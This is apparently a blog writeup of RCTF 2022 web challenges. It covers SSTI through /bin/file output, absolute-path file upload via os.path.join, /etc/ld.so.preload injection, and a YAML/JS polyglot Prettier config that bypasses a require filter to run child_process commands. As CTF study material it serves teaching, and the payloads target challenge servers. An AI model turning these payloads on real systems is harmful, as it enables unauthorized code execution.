<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>RCTF 2022 Notes - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


            
<link href="https://blog.huli.tw/2022/12/14/rctf-2022-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/12/14/en/rctf-2022-writeup/">
    





    <meta name="description" content="Here are some notes on the challenges I solved during RCTF 2022. I won’t be including those I didn’t attempt. As usual, here are the keywords:  Exploiting Python’s os.path.join YAML &amp; JS polyglot">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF 2022 Notes">
<meta property="og:url" content="https://blog.huli.tw/2022/12/14/en/rctf-2022-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="Here are some notes on the challenges I solved during RCTF 2022. I won’t be including those I didn’t attempt. As usual, here are the keywords:  Exploiting Python’s os.path.join YAML &amp; JS polyglot">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/rctf-2022-writeup/cover-en.png">
<meta property="article:published_time" content="2022-12-14T11:10:44.000Z">
<meta property="article:modified_time" content="2023-06-20T05:10:49.071Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/rctf-2022-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="RCTF 2022 Notes" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#filechecker-series">1&nbsp;&nbsp;<b>filechecker series</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#mini">1.1&nbsp;&nbsp;mini</a>
                    
                    
                    
                    <a class="navbar-item" href="#plus">1.2&nbsp;&nbsp;plus</a>
                    
                    
                    
                    <a class="navbar-item" href="#promax">1.3&nbsp;&nbsp;promax</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#prettieronline">2&nbsp;&nbsp;<b>PrettierOnline</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/12/14/rctf-2022-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            RCTF 2022 Notes
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-12-14T11:10:44.000Z" itemprop="datePublished">14 December 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>Here are some notes on the challenges I solved during RCTF 2022. I won’t be including those I didn’t attempt.</p>
<p>As usual, here are the keywords:</p>
<ol>
<li>Exploiting Python’s os.path.join</li>
<li>YAML &amp; JS polyglot</li>
<li>strace &amp; LD_PRELOAD</li>
</ol>
<span id="more"></span>

<h2><span id="filechecker-series">filechecker series</span></h2><h3><span id="mini">mini</span></h3><p>Code:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string
<span class="token keyword">from</span> waitress <span class="token keyword">import</span> serve
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess

app_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>app_dir<span class="token punctuation">&#125;</span></span><span class="token string">/upload/'</span></span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>result<span class="token operator">=</span><span class="token string">"ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿"</span><span class="token punctuation">)</span>

        <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
            f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file-upload'</span><span class="token punctuation">]</span>
            filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>

            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">".."</span> <span class="token keyword">in</span> filepath<span class="token punctuation">:</span>
                <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span><span class="token string">"Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)"</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
                file_check_res <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>
                    <span class="token punctuation">[</span><span class="token string">"/bin/file"</span><span class="token punctuation">,</span> <span class="token string">"-b"</span><span class="token punctuation">,</span> filepath<span class="token punctuation">]</span><span class="token punctuation">,</span> 
                    shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> 
                    encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>
                    timeout<span class="token operator">=</span><span class="token number">1</span>
                <span class="token punctuation">)</span>
                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token string">"empty"</span> <span class="token keyword">in</span> file_check_res <span class="token keyword">or</span> <span class="token string">"cannot open"</span> <span class="token keyword">in</span> file_check_res<span class="token punctuation">:</span>
                    file_check_res<span class="token operator">=</span><span class="token string">"wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ"</span>
                <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>file_check_res<span class="token punctuation">)</span>

    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span><span class="token string">'Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    serve<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3000</span><span class="token punctuation">,</span> threads<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span> cleanup_interval<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In short, you upload a file, and the server stores it. It then checks the file using <code>/bin/file</code> and passes the output to <code>render_template_string</code>. This means that if we can control the output, we can easily perform SSTI.</p>
<p>At the time, I went to the file’s Github to look for tests that I could use. Finally, I found this: <a target="_blank" rel="noopener" href="https://github.com/file/file/blob/master/tests/escapevel.result">https://github.com/file/file/blob/master/tests/escapevel.result</a></p>
<p>As you can see, the output includes a MIME type. This MIME type exists in the original file, so we just need to modify it.</p>
<p>After seeing other writeups, I realized that this is the simplest solution:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;testabc haha&#123;&#123;7+7&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The output will be:</p>
<pre class="line-numbers language-none"><code class="language-none">a &#x2F;testabc haha&#123;&#123;7+7&#125;&#125; script text executable, ASCII text, with no line terminators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3><span id="plus">plus</span></h3><p>Next is the enhanced version. The code is similar to the previous one, but the only difference is that the result is not passed to <code>render_template_string</code>, so SSTI is not possible.</p>
<p>At first, I thought that this challenge would be related to how file works. I thought it might be related to how it determines the type (magic&#x2F;libmagic), and then I would find a way to upload the flag file as input and write my own judgment to slowly leak the file content.</p>
<p>However, my teammate found a vulnerability in this part:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">".."</span> <span class="token keyword">in</span> filepath<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Python’s behavior is quite interesting. If the second parameter of <code>os.path.join</code> starts with <code>/</code>, it does not perform a join:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"/tmp/a/"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span> <span class="token comment"># /tmp/a/b</span>
os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"/tmp/a/"</span><span class="token punctuation">,</span> <span class="token string">"/b"</span><span class="token punctuation">)</span> <span class="token comment"># /b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Therefore, we can upload files to any location without <code>..</code>. We just need to write a C program to overwrite <code>/bin/file</code>.</p>
<h3><span id="promax">promax</span></h3><p>This challenge fixed half of the vulnerability in the previous challenge. It only prevents uploading if the file already exists, so we cannot overwrite it. We can only upload new files.</p>
<p>At this point, we still tried to find a solution based on the previous challenge. We looked for ways to use the existing mechanism. However, another teammate said he had a possible unexpected solution, and we solved it.</p>
<p>The idea is to upload a file to <code>/etc/ld.so.preload</code> with the contents of <code>/tmp/a.so</code>, and then upload another file to <code>/tmp/a.so</code>. At this point, the binary will load the code in the file before execution.</p>
<p>Here are the detailed answers from lavish in DC:</p>
<ol>
<li><code>os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], f.filename)</code> allows for arbitrary file upload when f.filename is an absolute path.</li>
<li>Unlike filechecker_plus, you can’t now overwrite existing files such as <code>/bin/file</code>, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem</li>
<li>If you strace an execution of <code>/bin/file</code>, you will notice that it tries to open (like any other executable) the <code>/etc/ld.so.preload</code> file. Have a look with <code>strace file -b &lt;whatever&gt; |&amp; grep ENOENT</code> -&gt; <code>access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</code></li>
<li><code>/etc/ld.so.preload</code> is used to specify a list of shared libraries that are preloaded when any executable is run</li>
<li>At this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a <code>/etc/ld.so.preload</code> containing the path to your .so and execute file again so that the flag is returned</li>
<li>Since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that file does a clean exit, otherwise subprocess.check_output will raise an exception.</li>
</ol>
<p>I haven’t actually used strace before, but I found it quite useful. Here’s a simple record of how to use it:</p>
<ol>
<li><code>strace file -b &lt;whatever&gt; |&amp; grep ENOENT</code></li>
<li><code>strace file /etc/passwd 2&gt;&amp;1 | grep &quot;No such file or directory&quot;</code></li>
</ol>
<p>You can see which system calls were called and which files were accessed.</p>
<p>Because this solution seems to have little to do with file, we always thought it was unexpected, but in the end we found out that it was actually the expected solution.</p>
<p>Author’s writeup: <a target="_blank" rel="noopener" href="https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022">https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022</a></p>
<h2><span id="prettieronline">PrettierOnline</span></h2><p>First of all, I really like this question.</p>
<p>The main code is here:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> prettier <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'prettier'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> nextTick<span class="token punctuation">,</span> exit <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'process'</span><span class="token punctuation">)</span>
<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./fw'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> id <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./dist/id'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
fs<span class="token punctuation">.</span><span class="token function">unlinkSync</span><span class="token punctuation">(</span><span class="token string">'./dist/id'</span><span class="token punctuation">)</span>
prettier<span class="token punctuation">.</span><span class="token function">resolveConfig</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>__dirname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/.prettierrc</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">config</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> ret <span class="token operator">=</span> prettier<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> config<span class="token punctuation">)</span>
  <span class="token keyword">const</span> o <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
  fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">./dist/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> o<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
  fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./dist/ret.js'</span><span class="token punctuation">,</span> ret<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
  <span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'No NextTick here!'</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Simply put, it loads the configuration file and then runs prettier. The only thing you can control in this question is the configuration file.</p>
<p>Then in <code>./fw.js</code>, it patches <code>require</code>:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> Module <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'module'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> oldRequire <span class="token operator">=</span> <span class="token class-name">Module</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>require
<span class="token class-name">Module</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">require</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> id <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Bye'</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">const</span> isCore <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">isBuiltin</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>isCore<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">fs|path|util|os</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Bye, '</span> <span class="token operator">+</span> id<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    id <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">_resolveFilename</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">oldRequire</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>oldRequire<span class="token punctuation">,</span> id<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
process<span class="token punctuation">.</span><span class="token function-variable function">dlopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Since it’s about prettier config, the first step is to look at the official documentation: <a target="_blank" rel="noopener" href="https://prettier.io/docs/en/configuration.html">https://prettier.io/docs/en/configuration.html</a></p>
<p>At the time, I saw a few points:</p>
<ol>
<li>Supports YAML</li>
<li>There is a Sharing configurations thing, which only puts a string and changes it to require that string</li>
</ol>
<p>For example, if your <code>.prettierrc</code> looks like this:</p>
<pre class="line-numbers language-none"><code class="language-none">hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>When you run prettier, you will get: <code>Error: Cannot find module &#39;hello&#39;</code></p>
<p>But because there are no other files that can be controlled on the server, we didn’t realize what we could do, so we continued to study what prettier actually did, and spent some time tracing it with a debugger. We found that even if you throw JSON, it still goes to <code>yaml.parse</code> to parse your code (which is a useless discovery).</p>
<p>Later, after looking around, I realized that there were plugins, so I wrote this configuration file:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
  &quot;plugins&quot;: [&quot;abc&quot;]
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>The error message <code>Error: Cannot find module &#39;abc&#39;</code> appears, indicating that prettier will require the plugin.</p>
<p>So what do we need to require? At this point, I thought of the only file we could control: <code>.prettierrc</code>, which means that if <code>.prettierrc</code> is both a configuration file and a JS file, it will work.</p>
<p>Fortunately, this is easy in YAML:</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">plugins</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> <span class="token string">".prettierrc"</span>
<span class="token key atrule">abc</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> console.log(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>plgusin:</code> is a tag in JS, <code>-</code> is a minus sign, so there is no problem at all. At this point, I thought this question was quite interesting, combining the concept of JS+yaml polyglot with real world prettier as an example.</p>
<p>After you can execute the code, you need to see how to bypass the require restriction. I tried <code>import()</code> but it didn’t work. Later, I thought that since any JS can be executed arbitrarily, I just need to change it randomly, like this:</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">plugins</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> <span class="token string">".prettierrc"</span>
<span class="token key atrule">abc</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> eval("h=RegExp.prototype.test;RegExp.prototype.test=function(v)<span class="token punctuation">&#123;</span><span class="token key atrule">return v == 'child_process' ? true</span> <span class="token punctuation">:</span> h.call(this<span class="token punctuation">,</span>v)<span class="token punctuation">&#125;</span>;f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c)<span class="token punctuation">&#123;</span> if(a=='./dist/ret.js')<span class="token punctuation">&#123;</span>b=f<span class="token punctuation">&#125;</span>; return w.call(fs<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c) <span class="token punctuation">&#125;</span>")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Readable version:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">h <span class="token operator">=</span> <span class="token class-name">RegExp</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>test<span class="token punctuation">;</span>
<span class="token class-name">RegExp</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">test</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
